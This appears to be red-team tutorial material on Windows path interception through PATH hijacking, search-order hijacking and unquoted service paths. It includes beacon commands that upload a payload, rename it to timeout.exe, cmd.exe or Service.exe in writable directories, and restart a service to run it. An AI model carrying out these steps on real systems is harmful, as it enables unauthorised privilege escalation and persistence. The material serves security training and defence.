Path interception occurs when an attacker places an executable in a location where it gets executed before the intended executable. It can happen through PATH environment variable manipulation, search-order hijacking, or unquoted service paths.

## 1. PATH Environment Variable — T1574.007
The `PATH` environment variable contains directories Windows searches to find executables. For example, running `net` may execute `C:\Windows\System32\net.exe`.
```
env
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Bad Windows Service;C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
```

This variable is constructed from two locations:
- User PATH: `HKEY_CURRENT_USER\Environment` — each user can modify their own PATH.
- Machine PATH: `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment` — standard users cannot modify it.

The PATH variable for user processes is a concatenation of the Machine + User paths, whereas system processes just use the Machine paths.  Path interception by the PATH variable [T1574.007] occurs when additional directories get added to the machine's variable that are also writable by standard users.

Software installers commonly add their own paths _before_ the default ones.
```
Path=C:\Python313\Scripts\;C:\Python313;C:\Windows\system32;C:\Windows; ... etc ...
```
This is particularly troublesome when the software is installed in the system root (i.e. C drive), because directories created here are writeable by standard users by default.

### Checking permissions
Use `cacls` to inspect file or directory permissions:
```
cacls C:\Python313\Scripts\
```

Permission abbreviations:
- `F` — Full Control
- `R` — Read and execute
- `C` — Read, write, execute, and delete
- `W` — Write

Example: If `Authenticated Users` can write to `C:\Python313\Scripts`, that directory may be exploitable.

``` C#
private void RunExecutable()
{
    while (!_cts.IsCancellationRequested)
    {
        try
        {
            Process.Start("cmd.exe", "/c timeout /t 30");
        }
        catch
        {
            // pokemon
        }
        Thread.Sleep(new TimeSpan(0, 1, 0));
    }
}
```
The timeout executable exists on disk at `C:\Windows\System32\timeout.exe`, which Windows must search the PATH environment variable to find.  This can therefore be exploited by dropping a binary called _timeout.exe_ into the `C:\Python313\Scripts` directory, because it will be searched before System32.
```
beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```

## 2. Search-Order Hijacking — T1574.008
When a script or command runs an executable using a relative path, Windows searches for the executable. Hijacking is possible when an attacker can write to a directory searched before the legitimate executable.

The exact search order depends on the API and its parameters.
### WinExec search order
1. Executing directory
2. Current working directory
3. `System32`
4. 16-bit system directory
5. Windows directory
6. Directories in PATH
### CreateProcess behaviour
- If `lpApplicationName` is provided, it searches only the current working directory.
- If `lpApplicationName` is omitted and `lpCommandLine` is provided, it follows the search order above.
- Services normally start with `C:\Windows\System32` as their current working directory. Therefore, a malicious `cmd.exe` in a PATH directory may not be found.
- The .NET `Process` class calls either `ShellExecuteEx` or `CreateProcess`, depending on the parameters.
- `ShellExecuteEx` assumes the current working directory when a partial path is provided
### Example: Hijacking `cmd.exe`
If the service executable's directory is writable, it may be searched before the current working directory and `System32`.

Check permissions
```
cacls "C:\Program Files\Bad Windows Service\Service Executable"
```
If `Authenticated Users` have Full Control:
```
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```

## 3. Unquoted Service Paths — T1574.009
When `CreateProcess` receives a command line containing spaces without quotation marks, it may interpret the path at successive whitespace boundaries rather than treating it as one complete path.

Example:
```
C:\Program Files\Bad Application\Bad Program.exe
```
Possible interpretations, in order:
```
C:\Program
C:\Program.exe
C:\Program Files\Bad
C:\Program Files\Bad.exe
C:\Program Files\Bad Application\Bad
C:\Program Files\Bad Application\Bad.exe
C:\Program Files\Bad Application\Bad Program.exe
C:\Program Files\Bad Application\Bad Program.exe.exe
```
Hijacking is possible if an attacker can write a malicious executable to an earlier interpreted path.

This output of `sc_enum` shows that BadWindowsService is configured with an unquoted path.
```
beacon> sc_enum

SERVICE_NAME: BadWindowsService
    [...snip...]
	BINARY_PATH_NAME               : C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
```
This can be exploited if they can write to a location within the path where it will be interpreted differently, such as `C:\Program Files\Bad.exe` or `C:\Program Files\Bad Windows Service\Service.exe`, etc.
```
cacls "C:\Program Files\Bad Windows Service"
```

If the directory is writable, an earlier path such as `C:\Program Files\Bad Windows Service\Service.exe` may be exploitable.
```
beacon> cd C:\Program Files\Bad Windows Service
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe Service.exe
```
A service runs its binary when it starts, so a service must be stopped and restarted to execute the malicious binary after it has been dropped to disk.  It may be the case that the adversary does not have permissions to do this, and therefore must wait until the computer restarts.  If they do have permissions, the `sc_stop` and `sc_start` commands can be used.

```
sc_stop BadWindowsService

sc_start BadWindowsService
```
